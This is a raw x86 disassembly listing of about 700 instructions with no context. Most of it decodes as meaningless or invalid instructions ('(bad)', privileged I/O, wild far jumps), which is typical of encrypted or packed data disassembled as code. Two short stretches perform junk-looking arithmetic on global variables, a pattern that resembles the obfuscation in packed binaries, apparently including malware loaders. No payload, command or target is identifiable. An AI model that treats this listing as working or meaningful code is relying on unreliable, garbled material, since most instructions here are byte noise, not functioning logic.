  402a78:	mov    ds:0x7702cc1a,eax
  402a7d:	dec    edx
  402a7e:	pusha  
  402a7f:	js     0x402a8f
  402a81:	mov    WORD PTR [ebp+0xf],?
  402a84:	fcmovnbe st,st(0)
  402a86:	sub    esp,DWORD PTR [ecx+0x27472687]
  402a8c:	(bad)  
  402a8d:	lds    ecx,FWORD PTR [ebx+eiz*1+0x5e]
  402a91:	fldenv ds:0xbab55bad
  402a97:	mov    edx,0xfbf47284
  402a9c:	add    esp,DWORD PTR [edi]
  402a9e:	fnsave [esi-0x5e]
  402aa1:	cmp    ecx,DWORD PTR [esi+0x2c238984]
  402aa7:	test   DWORD PTR [ecx+0x3e],edi
  402aaa:	xchg   DWORD PTR [edx-0x48ea388f],edi
  402ab0:	dec    esi
  402ab1:	loop   0x402a9b
  402ab3:	je     0x402af5
  402ab5:	mov    BYTE PTR [esi+ebp*2+0x66439df7],al
  402abc:	push   es
  402abd:	dec    ebp
  402abe:	inc    ebx
  402abf:	mov    ebx,0xc10bf312
  402ac4:	mov    ch,0x4a
  402ac6:	pop    edx
  402ac7:	data16 sti 
  402ac9:	jecxz  0x402aa4
  402acb:	(bad)  
  402acd:	call   0x90796c63
  402ad2:	out    0xe2,al
  402ad4:	sahf   
  402ad5:	inc    esi
  402ad6:	pop    edi
  402ad7:	ds xor eax,0xc04dad2c
  402add:	add    eax,0xf5ada986
  402ae2:	fsubr  DWORD PTR [edx]
  402ae4:	pushf  
  402ae5:	aas    
  402ae6:	pop    esp
  402ae7:	sahf   
  402ae8:	push   0x2e
  402aea:	push   cs
  402aeb:	jb     0x402adb
  402aed:	retf   
  402aee:	jae    0x402b1b
  402af0:	pop    edx
  402af1:	leave  
  402af2:	mov    cl,0xac
  402af4:	add    esi,esi
  402af6:	xchg   bl,dl
  402af8:	mov    ah,0xae
  402afa:	addr16 push cs
  402afc:	cdq    
  402afd:	sahf   
  402afe:	xchg   ebx,eax
  402aff:	inc    esp
  402b00:	jmp    0x402aaa
  402b02:	xchg   ebp,eax
  402b03:	sub    ebp,esp
  402b05:	or     eax,0xe011a78c
  402b0a:	retf   
  402b0b:	mov    edx,0xeb1cf315
  402b10:	add    al,0x3e
  402b12:	pop    es
  402b13:	retf   
  402b14:	cmc    
  402b15:	add    DWORD PTR [esi+0x79d74ca2],esp
  402b1b:	jmp    0xc054:0x6110c2b3
  402b22:	sub    al,0xfd
  402b24:	xor    esi,DWORD PTR [edx-0x2e]
  402b27:	jmp    0xe7c8968a
  402b2c:	mov    ebp,0xdcc6745c
  402b31:	out    0x3c,al
  402b33:	push   eax
  402b34:	pop    edx
  402b35:	jb     0x402ba9
  402b37:	mov    esp,0x48acdbea
  402b3c:	mov    bh,0x34
  402b3e:	rol    BYTE PTR [ebp+0x3b],0x67
  402b42:	lock and DWORD PTR [edi],ebp
  402b45:	inc    eax
  402b46:	and    al,0x99
  402b48:	mov    dh,0x5b
  402b4a:	pushf  
  402b4b:	hlt    
  402b4c:	jmp    FWORD PTR [ecx+0x15c42682]
  402b52:	paddusw mm2,QWORD PTR [edx-0x4fa940d1]
  402b59:	in     al,0x81
  402b5b:	mov    BYTE PTR [edx-0x2b],dh
  402b5e:	jns    0x402bba
  402b60:	sbb    eax,0x99394583
  402b65:	in     eax,0x15
  402b67:	mov    DWORD PTR [edx+0x6850517e],edi
  402b6d:	fisttp WORD PTR ds:0x1d810000
  402b73:	xlat   BYTE PTR ds:[ebx]
  402b74:	add    DWORD PTR [edx+0x0],0xffffffe0
  402b78:	inc    ecx
  402b79:	add    BYTE PTR [eax],al
  402b7b:	push   0x2d0f
  402b80:	call   0x4220b1
  402b85:	mov    ecx,DWORD PTR [ebp-0x68]
  402b88:	not    edx
  402b8a:	mov    edx,DWORD PTR [ebp-0x64]
  402b8d:	cmp    DWORD PTR ds:0x4282c3,0x0
  402b94:	mov    edx,DWORD PTR ds:0x4283d7
  402b9a:	mov    DWORD PTR ds:0x4281cf,0x2873
  402ba4:	movzx  edx,WORD PTR ds:0x428273
  402bab:	jmp    0x402c06
  402bb0:	mov    DWORD PTR ds:0x42834b,ebx
  402bb6:	cmp    DWORD PTR ds:0x4282c3,0x0
  402bbd:	jb     0x402be8
  402bc3:	push   DWORD PTR [ebp-0x1c]
  402bc6:	call   DWORD PTR ds:0x428dc4
  402bcc:	mov    edx,DWORD PTR ds:0x4282d3
  402bd2:	add    DWORD PTR ds:0x4282ab,edx
  402bd8:	mov    DWORD PTR ds:0x42834f,0x7648
  402be2:	adc    edx,DWORD PTR ds:0x42828b
  402be8:	mov    edx,DWORD PTR ds:0x42835b
  402bee:	sbb    DWORD PTR ds:0x4282e7,edx
  402bf4:	mov    edx,DWORD PTR ds:0x4282a3
  402bfa:	xor    DWORD PTR ds:0x428367,edx
  402c00:	and    edx,DWORD PTR ds:0x42833f
  402c06:	xor    eax,ecx
  402c08:	mov    ecx,DWORD PTR [ebp-0x70]
  402c0b:	xor    edx,0x594e
  402c11:	mov    edx,DWORD PTR [ebp-0x6c]
  402c14:	add    DWORD PTR ds:0x42826b,0x7b5b
  402c1e:	sub    eax,ecx
  402c20:	mov    ecx,DWORD PTR ds:0x428213
  402c26:	mov    ecx,DWORD PTR [ecx]
  402c28:	and    DWORD PTR ds:0x42829b,ecx
  402c2e:	mov    ecx,DWORD PTR ds:0x4225c8
  402c34:	or     DWORD PTR ds:0x428193,0x509d
  402c3e:	lea    eax,[eax+ecx*1-0x27d2]
  402c45:	mov    ecx,DWORD PTR [ebp-0x1c]
  402c48:	mov    edx,DWORD PTR [ebp-0x2c]
  402c4b:	sbb    DWORD PTR ds:0x42833b,0x9f0
  402c55:	or     ecx,0x4f00
  402c5b:	add    DWORD PTR ds:0x4283cf,0x4283ab
  402c65:	jmp    0x403043
  402c6a:	nop
  402c6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c6c:	(bad)  
  402c6d:	call   0x1caec68c
  402c72:	int    0x3e
  402c74:	cmp    DWORD PTR [ebx+eiz*4+0x8],0xffffffd3
  402c79:	mov    esp,0x1818f4b6
  402c7e:	sahf   
  402c7f:	adc    bl,BYTE PTR [eax]
  402c81:	sbb    BYTE PTR [ecx-0x31efa64],bl
  402c87:	out    0xa1,eax
  402c89:	mov    ch,0x41
  402c8b:	not    BYTE PTR [ebx+0x59a886f8]
  402c91:	sbb    al,0x65
  402c93:	mov    edi,DWORD PTR [ecx-0x71]
  402c96:	xchg   edx,eax
  402c97:	inc    ecx
  402c98:	xor    BYTE PTR [ecx],ah
  402c9a:	ja     0x402cbd
  402c9c:	cli    
  402c9d:	ds adc al,0x1d
  402ca0:	fcom   QWORD PTR [ecx-0x4d27cba1]
  402ca6:	test   ah,bh
  402ca8:	imul   edx,ecx,0xffffff88
  402cab:	dec    eax
  402cac:	add    ah,bh
  402cae:	and    BYTE PTR [esi+0x2f],0x61
  402cb2:	bound  ebx,QWORD PTR [esi]
  402cb4:	cld    
  402cb5:	push   esp
  402cb6:	xchg   BYTE PTR [ebx+0x2efdcae1],bl
  402cbc:	sub    al,0x4
  402cbe:	pop    ds
  402cbf:	xchg   ebx,eax
  402cc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cc1:	add    eax,0x1fffb9dd
  402cc6:	xor    al,0x59
  402cc8:	jo     0x402cbb
  402cca:	cmc    
  402ccb:	xlat   BYTE PTR ds:[ebx]
  402ccc:	ja     0x402d0d
  402cce:	mov    ch,0xae
  402cd0:	sti    
  402cd1:	jno    0x402ced
  402cd3:	and    BYTE PTR [edi+0x65],dh
  402cd6:	push   ds
  402cd7:	out    0xa7,eax
  402cd9:	dec    edx
  402cda:	fisttp WORD PTR [edi+ecx*1-0x74]
  402cde:	inc    edi
  402cdf:	mov    ebp,0x4862d5f1
  402ce4:	repnz ins DWORD PTR es:[edi],dx
  402ce6:	xchg   DWORD PTR [ebx+0x46],ebx
  402ce9:	into   
  402cea:	stos   DWORD PTR es:[edi],eax
  402ceb:	mov    edx,DWORD PTR [ebp+0x50]
  402cee:	into   
  402cef:	ret    
  402cf0:	jae    0x402cee
  402cf2:	jns    0x402d6d
  402cf4:	and    BYTE PTR [eax],0x5d
  402cf7:	add    esi,esi
  402cf9:	shl    BYTE PTR [esi-0x1e],cl
  402cfc:	fistp  QWORD PTR [ebx-0x69dcf2ea]
  402d02:	lods   eax,DWORD PTR ds:[esi]
  402d03:	dec    ebx
  402d04:	js     0x402cbf
  402d06:	add    DWORD PTR [esi+0x2b],0xfffffffc
  402d0a:	jmp    0x50d6:0x19614ba0
  402d11:	sti    
  402d12:	aas    
  402d13:	ja     0x402d6d
  402d15:	in     eax,dx
  402d16:	mov    edi,0x4d472f39
  402d1b:	mov    ds:0x589bf550,al
  402d20:	icebp  
  402d21:	mov    eax,0x8c399975
  402d26:	inc    edx
  402d27:	(bad)  
  402d28:	aad    0x92
  402d2a:	jae    0x402cce
  402d2c:	push   cs
  402d2d:	jbe    0x402d63
  402d2f:	dec    esi
  402d30:	xchg   edx,esi
  402d32:	xchg   esp,eax
  402d33:	xor    DWORD PTR [esi+eiz*1-0x11db0049],ecx
  402d3a:	jge    0x402d47
  402d3c:	pop    ecx
  402d3d:	(bad)  
  402d3f:	inc    ebp
  402d40:	pop    edi
  402d41:	out    dx,eax
  402d42:	outs   dx,BYTE PTR ds:[esi]
  402d43:	push   esi
  402d44:	jb     0x402d8d
  402d46:	adc    eax,0x22094e31
  402d4b:	dec    edi
  402d4c:	dec    edi
  402d4d:	push   esi
  402d4e:	(bad)  
  402d50:	imul   ebx,DWORD PTR [edx-0x2a927f57],0x71
  402d57:	xchg   ecx,eax
  402d58:	and    DWORD PTR ds:0x6c4f6c46,ebp
  402d5e:	in     eax,dx
  402d5f:	ja     0x402d03
  402d61:	pop    edx
  402d62:	(bad)  
  402d63:	sub    al,0x5b
  402d65:	lahf   
  402d66:	adc    BYTE PTR [edx-0x2e],cl
  402d69:	xor    eax,DWORD PTR [ebx+eax*8+0x53]
  402d6d:	popf   
  402d6e:	dec    eax
  402d6f:	jmp    0x402cf7
  402d71:	adc    DWORD PTR [ecx+eiz*1],ebx
  402d74:	es push edx
  402d76:	std    
  402d77:	adc    ch,BYTE PTR [edi+0x4f]
  402d7a:	inc    edx
  402d7b:	jp     0x402d21
  402d7d:	add    al,0x4a
  402d7f:	popa   
  402d80:	push   ecx
  402d81:	pop    esp
  402d82:	aad    0xa8
  402d84:	mov    ch,0xcc
  402d86:	or     cl,bl
  402d88:	jg     0x402ded
  402d8a:	sub    BYTE PTR [edi],cl
  402d8c:	cmp    BYTE PTR [esi+0x9],al
  402d8f:	and    dl,BYTE PTR [ebp+0x51d2bf4a]
  402d95:	xor    eax,0xe1da9de
  402d9a:	aas    
  402d9b:	fistp  WORD PTR [edi]
  402d9d:	mov    ch,0x22
  402d9f:	dec    DWORD PTR [eax+esi*4+0x17]
  402da3:	sub    esi,DWORD PTR [edx+0x5b7846f8]
  402da9:	pop    ds
  402daa:	dec    eax
  402dab:	shl    DWORD PTR ds:0xcb1a0822,cl
  402db1:	fs push ebx
  402db3:	scas   eax,DWORD PTR es:[edi]
  402db4:	mov    eax,ds:0x665c6e62
  402db9:	je     0x402e1c
  402dbb:	xlat   BYTE PTR ds:[ebx]
  402dbc:	cmc    
  402dbd:	fucomp st(5)
  402dbf:	test   BYTE PTR ds:0xe0521e55,dl
  402dc5:	pop    edi
  402dc6:	inc    edx
  402dc7:	lock sub cl,BYTE PTR ds:[ebp-0x50]
  402dcc:	neg    BYTE PTR [ebp+0x5]
  402dcf:	test   eax,0x2118f33f
  402dd4:	lods   al,BYTE PTR ds:[esi]
  402dd5:	mov    ds:0x784403ed,al
  402dda:	clc    
  402ddb:	pop    esi
  402ddc:	inc    ecx
  402ddd:	add    esi,DWORD PTR [eax+0x76e7f5bc]
  402de3:	push   edi
  402de4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402de5:	sti    
  402de6:	stos   DWORD PTR es:[edi],eax
  402de7:	ret    0x86ac
  402dea:	stos   DWORD PTR es:[edi],eax
  402deb:	test   bh,0x80
  402dee:	cdq    
  402def:	and    eax,0x59d4ad18
  402df4:	mov    fs,WORD PTR cs:[ebp+0x690ab04e]
  402dfb:	fs push es
  402dfd:	inc    edx
  402dfe:	xchg   ecx,eax
  402dff:	in     al,dx
  402e00:	fistp  DWORD PTR [edi+0x4ee33400]
  402e06:	ja     0x402dc4
  402e08:	aaa    
  402e09:	clc    
  402e0a:	adc    edi,DWORD PTR [ecx-0x38]
  402e0d:	idiv   DWORD PTR [edi+0x7e]
  402e10:	(bad)  
  402e11:	mov    ds:0xa4e23096,al
  402e16:	and    al,0x12
  402e18:	bound  ebx,QWORD PTR [ebx]
  402e1a:	leave  
  402e1b:	ins    BYTE PTR es:[edi],dx
  402e1c:	mov    edx,0x4ea3db36
  402e21:	xor    eax,0xec3b1cd9
  402e26:	mov    ebp,DWORD PTR [ebp-0x6b308682]
  402e2c:	sub    BYTE PTR [edi],ch
  402e2e:	pop    esi
  402e2f:	(bad)  
  402e30:	loopne 0x402e30
  402e32:	call   0x22a2538f
  402e37:	test   DWORD PTR [esi+0x76],edx
  402e3a:	sahf   
  402e3b:	neg    DWORD PTR [edx]
  402e3d:	mov    bh,0x36
  402e3f:	fiadd  WORD PTR [esi+0xd]
  402e42:	in     eax,0xd7
  402e44:	data16 aad 0x3
  402e47:	xchg   ebx,eax
  402e48:	out    0xf8,al
  402e4a:	je     0x402e2f
  402e4c:	mov    edx,0xa87d8bda
  402e51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e52:	jmp    0xae07:0x8f8c336b
  402e59:	call   0x94e9:0x86a6a5fc
  402e60:	stos   DWORD PTR es:[edi],eax
  402e61:	imul   esi,DWORD PTR [eax-0x72],0xffffffa2
  402e65:	xchg   ebp,eax
  402e66:	sub    ah,BYTE PTR cs:[ecx-0x7b01c517]
  402e6d:	nop
  402e6e:	bound  eax,QWORD PTR [ecx-0x4c]
  402e71:	cdq    
  402e72:	jmp    0x6988:0x2d20058f
  402e79:	xchg   BYTE PTR [ecx-0x6f],cl
  402e7c:	sbb    edx,edx
  402e7e:	pop    ebx
  402e7f:	push   esi
  402e80:	xchg   ecx,eax
  402e81:	push   cs
  402e82:	cmp    BYTE PTR [ecx],bl
  402e84:	inc    edx
  402e85:	icebp  
  402e86:	cdq    
  402e87:	mov    cl,0xd5
  402e89:	sbb    DWORD PTR [esi+0x4b],0xffffffd2
  402e8d:	jmp    0x402e19
  402e8f:	jle    0x402f04
  402e91:	or     al,0xf5
  402e93:	pop    ecx
  402e94:	sub    bl,cl
  402e96:	sub    DWORD PTR [eax],eax
  402e98:	jecxz  0x402f17
  402e9a:	ret    0xc17
  402e9d:	cmp    dh,BYTE PTR [edx]
  402e9f:	(bad)  
  402ea0:	pop    esp
  402ea1:	out    0xfc,eax
  402ea3:	and    dl,0x2e
  402ea6:	pop    ss
  402ea7:	cs pop es
  402ea9:	push   edi
  402eaa:	adc    cl,cl
  402eac:	ficomp WORD PTR [esi-0x1197e8ed]
  402eb2:	loopne 0x402e5a
  402eb4:	daa    
  402eb5:	icebp  
  402eb6:	ja     0x402f30
  402eb8:	mov    eax,0x4b4f6487
  402ebd:	test   ebp,ebx
  402ebf:	cld    
  402ec0:	cmp    bl,bl
  402ec2:	cld    
  402ec3:	shr    BYTE PTR [eax],cl
  402ec5:	out    dx,eax
  402ec6:	mov    ebx,0x47ba1b89
  402ecb:	clc    
  402ecc:	in     al,dx
  402ecd:	and    al,0xa5
  402ecf:	cdq    
  402ed0:	push   es
  402ed1:	test   esp,0x80d180b5
  402ed7:	or     al,0xef
  402ed9:	daa    
  402eda:	xchg   ebx,eax
  402edb:	xor    al,0xa
  402edd:	aam    0xc8
  402edf:	outs   dx,BYTE PTR ds:[esi]
  402ee0:	or     al,0xd9
  402ee2:	outs   dx,DWORD PTR ds:[esi]
  402ee3:	out    dx,eax
  402ee4:	daa    
  402ee5:	inc    ebp
  402ee6:	imul   ecx,edi,0x72
  402ee9:	xor    edi,DWORD PTR [ebx]
  402eeb:	adc    edi,DWORD PTR [edx+esi*1+0x29d41c75]
  402ef2:	pop    ecx
  402ef3:	jb     0x402ee4
  402ef5:	lods   eax,DWORD PTR ds:[esi]
  402ef6:	ss jle 0x402ec5
  402ef9:	sbb    BYTE PTR [ebx+0x56],bl
  402efc:	mov    cl,0x80
  402efe:	mov    eax,ds:0x3b8c819f
  402f03:	test   esp,edx
  402f05:	fcmovbe st,st(0)
  402f07:	jo     0x402eb7
  402f09:	sub    BYTE PTR [eax+eiz*4+0x2f01f965],ah
  402f10:	adc    eax,DWORD PTR [eax-0x15]
  402f13:	xlat   BYTE PTR ds:[ebx]
  402f14:	arpl   bx,sp
  402f16:	stos   DWORD PTR es:[edi],eax
  402f17:	sub    al,0x7c
  402f19:	jno    0x402f4f
  402f1b:	test   BYTE PTR ds:0xa1ca231,bl
  402f21:	into   
  402f22:	outs   dx,DWORD PTR ds:[esi]
  402f23:	xchg   ecx,eax
  402f24:	push   esi
  402f25:	push   ss
  402f26:	js     0x402f21
  402f28:	dec    ecx
  402f29:	sub    eax,0x2cfd69f5
  402f2e:	push   ebx
  402f2f:	dec    esp
  402f30:	popf   
  402f31:	ror    bh,0x74
  402f34:	lods   eax,DWORD PTR ds:[esi]
  402f35:	push   ebx
  402f36:	push   eax
  402f37:	das    
  402f38:	and    DWORD PTR [edi],ebp
  402f3a:	xor    edi,DWORD PTR [ebx-0x1f9b8f5c]
  402f40:	fyl2xp1 
  402f42:	fcmove st,st(2)
  402f44:	stos   DWORD PTR es:[edi],eax
  402f45:	test   BYTE PTR [edi+ecx*2-0x2432f9a5],bl
  402f4c:	adc    bl,BYTE PTR [edi]
  402f4e:	jo     0x402fc6
  402f50:	pop    ebp
  402f51:	loop   0x402f44
  402f53:	stc    
  402f54:	add    al,0xf2
  402f56:	add    al,0xec
  402f58:	es (bad) 
  402f5a:	cmp    ch,BYTE PTR [esi]
  402f5c:	cmc    
  402f5d:	mov    edi,0x30adc35a
  402f62:	push   esp
  402f63:	mov    ebx,DWORD PTR [ebx]
  402f65:	enter  0x96e4,0x30
  402f69:	push   esp
  402f6a:	mov    DWORD PTR [edi],0x60bb83f2
  402f70:	retf   
  402f71:	adc    BYTE PTR [edi+eax*4],0x67
  402f75:	lds    edx,FWORD PTR [ebx+0x66]
  402f78:	dec    ebp
  402f79:	(bad)  
  402f7a:	mov    ch,0x4e
  402f7c:	inc    edx
  402f7d:	les    eax,FWORD PTR [esi+0x1bd07025]
  402f83:	(bad)  
  402f84:	pushf  
  402f85:	mov    ebx,0xe9767347
  402f8a:	adc    bl,BYTE PTR [eax+0x43]
  402f8d:	cwde   
  402f8e:	add    al,0x97
  402f90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f91:	pop    esi
  402f92:	loop   0x402f85
  402f94:	push   ss
  402f95:	cli    
  402f96:	push   es
  402f97:	or     BYTE PTR [edx+edx*1+0x7671391],al
  402f9e:	adc    al,0x50
  402fa0:	ror    ch,0x36
  402fa3:	adc    dl,BYTE PTR [ebx]
  402fa5:	mov    esp,0x5f80b16e
  402faa:	in     eax,0xc7
  402fac:	idiv   BYTE PTR ds:0x884e4282
  402fb2:	test   edi,edx
  402fb4:	or     BYTE PTR [ebp-0x3f],bh
  402fb7:	add    dh,al
  402fb9:	jle    0x40301c
  402fbb:	fcom   QWORD PTR [edx+edx*1-0x4f]
  402fbf:	push   eax
  402fc0:	jne    0x402fdf
  402fc2:	fimul  DWORD PTR [eax]
  402fc4:	aam    0x5a
  402fc6:	mov    ds:0x30af5205,eax
  402fcb:	and    DWORD PTR [ebp-0x26e67c03],0x16a928e1
  402fd5:	in     eax,0x18
  402fd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fd8:	mov    esp,DWORD PTR [ecx+0x25]
  402fdb:	std    
  402fdc:	push   0x7c
  402fde:	jmp    0x402f65
  402fe0:	popa   
  402fe1:	shl    DWORD PTR [ebx-0x819d803],1
  402fe7:	std    
  402fe8:	mov    cl,0x4b
  402fea:	scas   eax,DWORD PTR es:[di]
  402fec:	jecxz  0x403056
  402fee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fef:	jno    0x403063
  402ff1:	xor    BYTE PTR [edx-0x23],dh
  402ff4:	lahf   
  402ff5:	test   DWORD PTR [edx],0x887ad190
  402ffb:	ror    BYTE PTR [esp+ecx*2],cl
  402ffe:	stc    
  402fff:	xchg   edi,eax
  403000:	and    ch,ch
  403002:	loopne 0x402ffb
  403004:	mov    eax,0x1ca098ec
  403009:	cmp    DWORD PTR [ecx-0x368aa6a1],esp
  40300f:	mov    al,ds:0xd12c35e6
  403014:	inc    ecx
  403015:	adc    dh,BYTE PTR [ebp+0x2813d8e2]
  40301b:	out    dx,al
  40301c:	int    0x16
  40301e:	jnp    0x40302f
  403020:	adc    BYTE PTR [ecx],dh
  403022:	int3   
  403023:	inc    edx
  403024:	or     dl,BYTE PTR ds:0x8b679f2b
  40302a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40302b:	loopne 0x40306e
  40302d:	daa    
  40302e:	or     dl,BYTE PTR [ebx+0x38]
  403031:	scas   al,BYTE PTR es:[edi]
  403032:	sbb    dl,bl
  403034:	fisttp QWORD PTR [ecx-0x3d]
  403037:	fstp   QWORD PTR [ebp+0x27cb2e9f]
  40303d:	fimul  DWORD PTR [esi-0x55f22e8b]
  403043:	and    ecx,edx
  403045:	add    edx,0x3463
  40304b:	mov    edx,DWORD PTR [ebp-0x34]
  40304e:	or     ecx,edx
  403050:	xor    ecx,0x5fdd
  403056:	cmp    ecx,DWORD PTR [eax]
  403058:	mov    DWORD PTR ds:0x4282db,0x665d
  403062:	jne    0x40a9b0
  403068:	mov    ecx,DWORD PTR [esi]
  40306a:	cmp    DWORD PTR ds:0x4283df,0x0
  403071:	mov    DWORD PTR ds:0x4283e3,edx
  403077:	mov    DWORD PTR ds:0x42832b,0x1413
  403081:	mov    edx,DWORD PTR ds:0x4283d3
  403087:	jmp    0x4030db
  40308c:	mov    DWORD PTR ds:0x42819f,0x4beb
  403096:	not    eax
  403098:	cmp    DWORD PTR ds:0x4283df,0x0
  40309f:	jl     0x4030c1
  4030a5:	push   DWORD PTR [ebp-0x20]
  4030a8:	push   DWORD PTR [ebp-0xc]
  4030ab:	call   DWORD PTR ds:0x428de4
  4030b1:	mov    DWORD PTR ds:0x42828b,0x4e29
  4030bb:	inc    DWORD PTR ds:0x4282af
  4030c1:	or     edx,DWORD PTR ds:0x42834b
  4030c7:	add    edx,DWORD PTR ds:0x4281cf
  4030cd:	sub    edx,edx
  4030cf:	add    DWORD PTR ds:0x4283d7,edx
  4030d5:	sbb    edx,DWORD PTR ds:0x42835f
  4030db:	mov    eax,DWORD PTR [esi+0x4]
  4030de:	sbb    edx,DWORD PTR ds:0x4283c3
  4030e4:	shrd   ecx,eax,0x2
  4030e8:	shr    eax,0x2
  4030eb:	mov    eax,DWORD PTR [esi]
  4030ed:	xor    DWORD PTR ds:0x4283e3,edx
  4030f3:	mov    edx,DWORD PTR [esi+0x4]
  4030f6:	neg    DWORD PTR ds:0x42819b
  4030fc:	shl    eax,0x1e
  4030ff:	xor    ecx,edi
  403101:	xor    eax,eax
  403103:	sbb    DWORD PTR ds:0x4283e7,0x1e67
  40310d:	or     eax,ecx
  40310f:	jmp    0x4034ed
  403114:	and    al,0xd6
  403116:	push   esp
  403117:	repnz and dh,BYTE PTR [ebx+0x22]
  40311b:	inc    esi
  40311c:	sar    BYTE PTR [eax-0x73],1
  40311f:	jo     0x403181
  403121:	add    esp,DWORD PTR [ebx]
  403123:	stos   BYTE PTR es:[edi],al
  403124:	cmp    eax,0x9e1818ec
  403129:	adc    bl,BYTE PTR [eax]
  40312b:	sbb    BYTE PTR [eax-0x4a],ah
  40312e:	dec    eax
  40312f:	daa    
  403130:	fild   DWORD PTR [edi-0x62]
  403133:	fcomp  QWORD PTR [ebp-0x376c3d63]
  403139:	or     BYTE PTR [ebx],al
  40313b:	imul   edi,DWORD PTR [eax],0x8b199deb
  403141:	xchg   BYTE PTR [edx+ecx*4],al
  403144:	mov    esp,0x3ddf7e91
  403149:	or     al,BYTE PTR [ebp+0x58fe0c2e]
  40314f:	add    ch,BYTE PTR [ebp-0x4ec01faf]
  403155:	pop    edx
  403156:	popa   
  403157:	sti    
  403158:	mov    bh,0x50
  40315a:	or     esi,esp
  40315c:	(bad)  
  40315e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40315f:	add    DWORD PTR [ebp+0x6ff86d16],0x48e956b7
  403169:	(bad)  
  40316a:	in     eax,dx
  40316b:	stc    
  40316c:	icebp  
  40316d:	mov    eax,ds:0xc36758fb
  403172:	push   ebp
  403173:	pop    ecx
  403174:	jo     0x40314e
  403176:	mov    WORD PTR [ecx-0x29],fs
  403179:	and    al,0x2a
  40317b:	(bad)  
  40317c:	sahf   
  40317d:	inc    esi
  40317e:	and    DWORD PTR [edx],edi
  403180:	aam    0x31
  403182:	push   0xe9bdd490
  403187:	push   ecx
  403188:	add    ch,bh
  40318a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40318b:	or     dl,BYTE PTR [ecx+edi*1-0x2030f984]
  403192:	mov    BYTE PTR [ebx+0x7d9849c8],0x4b
  403199:	stc    
  40319a:	shl    DWORD PTR [esi+0x25],cl
  40319d:	cmc    
  40319e:	inc    edx
  40319f:	test   BYTE PTR [eax-0x4d],ch
  4031a2:	inc    esi
  4031a3:	aas    
  4031a4:	loopne 0x40315e
  4031a6:	adc    al,0xdb
  4031a8:	sbb    eax,DWORD PTR [esi-0x27]
  4031ab:	sub    DWORD PTR ds:0xf0e6574b,edi
  4031b1:	repnz adc eax,0xdbfe06ce
  4031b7:	xchg   ebp,eax
  4031b8:	mov    ?,WORD PTR [ecx]
  4031ba:	mov    al,0x14
  4031bc:	and    ebx,DWORD PTR [eax-0x674c6bb6]
  4031c2:	sar    bl,1
  4031c4:	mov    al,ds:0x42b36559
  4031c9:	jg     0x403199
  4031cb:	push   edx
  4031cc:	mov    esi,0x644afd58
  4031d1:	daa    
  4031d2:	jno    0x403202
  4031d4:	push   ds
  4031d5:	fld    QWORD PTR [ebx]
  4031d7:	mov    WORD PTR [edi+edi*2],cs
  4031da:	cs iret 
  4031dc:	and    eax,0x86d36232
  4031e1:	add    DWORD PTR [edx],ebx
  4031e3:	retf   0x8f72
  4031e6:	jl     0x4031be
  4031e8:	aas    
  4031e9:	ins    BYTE PTR es:[edi],dx
  4031ea:	lds    edi,FWORD PTR ds:0xe9016667
  4031f0:	push   edi
  4031f1:	(bad)  
  4031f2:	stos   DWORD PTR es:[edi],eax
  4031f3:	es rcl ebp,cl
  4031f6:	push   0xfffffffa
  4031f8:	jp     0x40326c
  4031fa:	ret    0x308f
  4031fd:	inc    esp
  4031fe:	fdiv   st(3),st
  403200:	ffree  st(5)
  403202:	add    eax,0x5a129d61
  403207:	lea    ecx,[ecx+ebx*2+0x70228967]
  40320e:	sub    BYTE PTR [edx+0x37ef6a09],0x40
  403215:	fs addr16 call 0x6aef:0x2e825421
  40321e:	ret    
  40321f:	aas    
  403220:	add    eax,0xf59b3821
  403225:	test   eax,0xc48ccc71
  40322a:	xchg   ecx,eax
  40322b:	mov    cl,BYTE PTR [edi-0x74]
  40322e:	push   0x96f590d8
  403233:	sbb    al,0xea
  403235:	cs (bad) 
  403237:	or     eax,0xdf0486b0
  40323c:	pop    ebx
  40323d:	(bad)
  403241:	fdiv   QWORD PTR [eax]
  403243:	mov    edx,0xbd8ab01f
  403248:	sub    bl,bl
  40324a:	pop    ebx
  40324b:	stos   DWORD PTR es:[edi],eax
  40324c:	lods   eax,DWORD PTR ds:[esi]
  40324d:	pop    esi
  40324e:	ja     0x40326f
  403250:	push   eax
  403251:	jo     0x40322c
  403253:	or     esp,0x9c141ff7
  403259:	push   esp
  40325a:	jle    0x403201
  40325c:	repnz outs dx,DWORD PTR ds:[esi]
  40325e:	pop    edi
  40325f:	fxch   st(7)
  403261:	sti    
  403262:	fwait
  403263:	jle    0x403274
  403265:	ins    BYTE PTR es:[edi],dx
  403266:	jno    0x403257
  403268:	cmp    DWORD PTR [edx-0x6fbf715],edx
  40326e:	(bad)  
  40326f:	call   0xf1c64c0d
  403274:	pop    ebp
  403275:	fstp   TBYTE PTR [edx-0x3b950509]
  40327b:	sti    
  40327c:	mov    eax,0xed0b29d9
  403281:	push   eax
  403282:	int3   
  403283:	stos   BYTE PTR es:[edi],al
  403284:	es pop esi
  403286:	fmulp  st(7),st
  403288:	inc    esi
  403289:	jno    0x40321b
  40328b:	lock cmc 
  40328d:	out    0x4b,eax
  40328f:	clc    
  403290:	or     eax,0x44208
  403295:	add    eax,DWORD PTR cs:[edi-0x4a]
  403299:	sahf   
  40329a:	mov    ah,dl
  40329c:	pusha  
  40329d:	icebp  
  40329e:	mov    bh,0x77
  4032a0:	mov    ebp,0x7a47a23c
  4032a5:	test   eax,0xbcd154c8
  4032aa:	mov    WORD PTR [ebx+0x1d],?
  4032ad:	dec    esi
  4032ae:	mov    eax,ds:0x82262dd3
  4032b3:	sub    edi,DWORD PTR [eax-0x28ea871a]
  4032b9:	fimul  WORD PTR [edx-0x7f]
  4032bc:	sahf   
  4032bd:	inc    esp
  4032be:	sub    dl,BYTE PTR [edx-0x4e]
  4032c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032c2:	jmp    0x403312
  4032c4:	jl     0x4032f1
  4032c6:	dec    ebp
  4032c7:	dec    ebx
  4032c8:	shl    BYTE PTR cs:[ebx-0x28b82f7f],0x32
  4032d0:	push   esi
